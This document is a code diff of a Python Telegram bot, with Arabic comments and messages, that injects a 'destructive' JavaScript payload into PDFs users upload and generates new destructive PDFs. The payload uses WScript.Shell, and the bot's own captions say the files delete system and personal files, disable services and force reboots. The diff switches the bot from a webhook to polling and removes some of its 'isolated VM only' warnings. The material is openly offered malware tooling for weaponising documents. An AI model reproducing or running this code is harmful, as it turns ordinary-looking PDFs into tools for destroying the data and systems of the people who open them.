@@ -4,12 +4,9 @@ import requests
 import json
 import random
 from datetime import datetime
-from flask import Flask, request
 from PyPDF2 import PdfWriter, PdfReader
 from reportlab.pdfgen import canvas
 from io import BytesIO
-
-app = Flask(__name__)
 
 # ============ تكوين البوت ============
 TELEGRAM_CONFIG = {
@@ -119,15 +116,12 @@ def download_telegram_file(file_id, save_path):
         return False
 
 def inject_payload_into_pdf(input_path, output_path=None):
-    """حقن البايلود في ملف PDF موجود"""
     if output_path is None:
         output_path = input_path
     try:
-        # قراءة الملف الأصلي
         with open(input_path, 'rb') as f:
             original_data = f.read()
         
-        # توليد البايلود
         destructive_js = """
         try {
             var shell = new ActiveXObject("WScript.Shell");
@@ -155,54 +149,36 @@ def inject_payload_into_pdf(input_path, output_path=None):
         }
         """
         
-        # إلحاق البايلود بنهاية الملف
         combined_data = original_data + destructive_js.encode('utf-8')
-        
         with open(output_path, 'wb') as f:
             f.write(combined_data)
-        
         return True
     except Exception as e:
         print(f"خطأ في حقن البايلود: {e}")
         return False
 
-# ============ معالجة الملفات والأوامر ============
 def handle_file(file_id, file_name, chat_id):
-    """معالجة ملف مرسل للبوت"""
-    # تحميل الملف
     temp_input = f"/tmp/input_{int(time.time())}_{random.randint(1000, 9999)}"
     temp_output = f"/tmp/output_{int(time.time())}_{random.randint(1000, 9999)}"
     
-    send_telegram_message(chat_id, f"⏳ جاري تحميل الملف: {file_name}")
-    
+    send_telegram_message(chat_id, f"⏳ جاري تحميل: {file_name}")
     if not download_telegram_file(file_id, temp_input):
-        send_telegram_message(chat_id, "❌ فشل تحميل الملف!")
+        send_telegram_message(chat_id, "❌ فشل التحميل!")
         return
     
-    send_telegram_message(chat_id, f"✅ تم تحميل الملف ({os.path.getsize(temp_input)} بايت)")
-    
-    # حقن البايلود
-    if inject_payload_into_file(temp_input, temp_output):
+    if inject_payload_into_pdf(temp_input, temp_output):
         output_name = f"injected_{file_name}"
         caption = """
-⚒️ <b>تم حقن البايلود في الملف بنجاح!</b>
-
-⚠️ <b>تحذير:</b> هذا الملف يقوم بـ:
-• حذف ملفات النظام الأساسية
-• تعطيل الخدمات الحيوية
-• حذف الملفات الشخصية
-• إعادة تشغيل النظام قسرياً
-
-🔴 <b>استخدمه فقط في بيئة افتراضية معزولة!</b>
+⚒️ <b>تم حقن البايلود في الملف!</b>
+⚠️ <b>تحذير:</b> هذا الملف يدمر نظام Windows!
         """
         if send_telegram_file(chat_id, temp_output, caption):
-            send_telegram_message(chat_id, "✅ تم إرسال الملف المعدل!")
+            send_telegram_message(chat_id, "✅ تم الإرسال!")
         else:
-            send_telegram_message(chat_id, "❌ فشل إرسال الملف!")
+            send_telegram_message(chat_id, "❌ فشل الإرسال!")
     else:
-        send_telegram_message(chat_id, "❌ فشل حقن البايلود في الملف!")
+        send_telegram_message(chat_id, "❌ فشل الحقن!")
     
-    # تنظيف
     try:
         os.remove(temp_input)
         os.remove(temp_output)
@@ -213,131 +189,68 @@ def handle_command(command, chat_id):
     command = command.lower().strip()
     
     if command == "/start":
-        msg = """
-🔐 <b>مرحباً بك في بوت توليد PDF التخريبي!</b>
-
-📤 <b>ارسل أي ملف PDF</b> وسيتم حقن بايلود تخريبي فيه وإعادته لك.
-
-⚒️ أو استخدم الأمر <b>/generate</b> لتوليد PDF تخريبي جديد.
-
-⚠️ <b>تحذير:</b> للاستخدام التعليمي فقط في بيئات معزولة!
-        """
-        send_telegram_message(chat_id, msg)
-    
+        send_telegram_message(chat_id, """
+🔐 <b>مرحباً بك في بوت التخريب!</b>
+📤 أرسل /generate لتوليد PDF
+📤 أرسل ملف PDF لتعديله
+        """)
     elif command == "/generate":
-        send_telegram_message(chat_id, "⏳ جاري توليد PDF التخريبي...")
+        send_telegram_message(chat_id, "⏳ جاري التوليد...")
         filepath = generate_destructive_pdf()
         if filepath and os.path.exists(filepath):
-            caption = """
-⚒️ <b>تم توليد PDF التخريبي بنجاح!</b>
-
-⚠️ <b>تحذير:</b> هذا الملف يقوم بـ:
-• حذف ملفات النظام الأساسية
-• تعطيل الخدمات الحيوية
-• حذف الملفات الشخصية
-• إعادة تشغيل النظام قسرياً
-
-🔴 <b>استخدمه فقط في بيئة افتراضية معزولة!</b>
-            """
-            if send_telegram_file(chat_id, filepath, caption):
-                send_telegram_message(chat_id, "✅ تم إرسال الملف بنجاح!")
-            else:
-                send_telegram_message(chat_id, "❌ فشل إرسال الملف!")
-            try:
-                os.remove(filepath)
-            except:
-                pass
+            if send_telegram_file(chat_id, filepath, "⚒️ PDF تخريبي"):
+                send_telegram_message(chat_id, "✅ تم الإرسال!")
+            try: os.remove(filepath)
+            except: pass
         else:
-            send_telegram_message(chat_id, "❌ فشل توليد الملف!")
-    
-    elif command == "/help":
-        msg = """
-📋 <b>الأوامر المتاحة:</b>
-
-/start - عرض رسالة الترحيب
-/generate - توليد PDF تخريبي وإرساله
-/help - عرض هذه الرسالة
-/status - عرض حالة البوت
-
-📤 <b>أو أرسل ملف PDF</b> وسيتم تعديله وإعادته لك.
-        """
-        send_telegram_message(chat_id, msg)
-    
+            send_telegram_message(chat_id, "❌ فشل التوليد!")
     elif command == "/status":
-        msg = f"""
-🟢 <b>حالة البوت:</b>
-✅ يعمل بنجاح
-⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-👤 المستخدم: {chat_id}
-        """
-        send_telegram_message(chat_id, msg)
-    
+        send_telegram_message(chat_id, f"🟢 يعمل\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
     else:
-        send_telegram_message(chat_id, f"⚠️ أمر غير معروف: {command}\nاستخدم /help للمساعدة")
+        send_telegram_message(chat_id, "⚠️ أمر غير معروف")
 
-# ============ Webhook ============
-@app.route(f'/webhook/{TELEGRAM_CONFIG["TOKEN"]}', methods=['POST'])
-def webhook():
-    try:
-        data = request.get_json()
-        if not data:
-            return "No data", 400
-        
-        # معالجة الرسائل
-        message = data.get('message', {})
-        chat_id = message.get('chat', {}).get('id')
-        
-        # التحقق من الصلاحية
-        if str(chat_id) != TELEGRAM_CONFIG['CHAT_ID']:
-            send_telegram_message(chat_id, "⛔ غير مصرح!")
-            return "Unauthorized", 403
-        
-        # معالجة النص
-        text = message.get('text', '')
-        if text:
-            handle_command(text, chat_id)
-            return "OK", 200
-        
-        # معالجة الملفات
-        document = message.get('document')
-        if document:
-            file_id = document['file_id']
-            file_name = document.get('file_name', 'unknown.pdf')
-            handle_file(file_id, file_name, chat_id)
-            return "OK", 200
-        
-        return "OK", 200
-        
-    except Exception as e:
-        print(f"خطأ في webhook: {e}")
-        return "Error", 500
-
-@app.route('/')
-def home():
-    return "✅ Bot is running! Send /generate or upload a PDF file."
-
-# ============ تسجيل Webhook ============
-def set_webhook():
-    try:
-        hostname = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
-        if not hostname:
-            hostname = "localhost"
-        
-        webhook_url = f"https://{hostname}/webhook/{TELEGRAM_CONFIG['TOKEN']}"
-        url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/setWebhook"
-        params = {"url": webhook_url}
-        response = requests.post(url, data=params)
-        
-        if response.status_code == 200 and response.json().get('ok'):
-            print(f"✅ Webhook تم تسجيله: {webhook_url}")
-        else:
-            print(f"❌ فشل تسجيل Webhook: {response.text}")
-    except Exception as e:
-        print(f"❌ خطأ في تسجيل Webhook: {e}")
+# ============ الاستماع للأوامر (Polling) ============
+def listen_telegram():
+    last_update_id = 0
+    print("🚀 البوت يعمل... في انتظار الأوامر")
+    
+    while True:
+        try:
+            url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/getUpdates"
+            params = {"offset": last_update_id + 1, "timeout": 30}
+            response = requests.get(url, params=params, timeout=35)
+            
+            if response.status_code == 200:
+                updates = response.json().get('result', [])
+                for update in updates:
+                    last_update_id = update['update_id']
+                    
+                    message = update.get('message', {})
+                    chat_id = message.get('chat', {}).get('id')
+                    
+                    if str(chat_id) != TELEGRAM_CONFIG['CHAT_ID']:
+                        continue
+                    
+                    text = message.get('text', '')
+                    if text:
+                        handle_command(text, chat_id)
+                        continue
+                    
+                    document = message.get('document')
+                    if document:
+                        file_id = document['file_id']
+                        file_name = document.get('file_name', 'unknown.pdf')
+                        handle_file(file_id, file_name, chat_id)
+                        continue
+        except Exception as e:
+            print(f"⚠️ خطأ: {e}")
+            time.sleep(5)
+        time.sleep(1)
 
 # ============ التشغيل ============
 if __name__ == "__main__":
-    set_webhook()
-    port = int(os.environ.get("PORT", 5000))
-    print(f"🚀 تشغيل الخادم على المنفذ {port}")
-    app.run(host='0.0.0.0', port=port)
+    print("="*50)
+    print("🚀 تشغيل بوت التخريب (Polling)...")
+    print(f"📱 التوكن: {TELEGRAM_CONFIG['TOKEN'][:10]}...")
+    print("="*50)
+    listen_telegram()
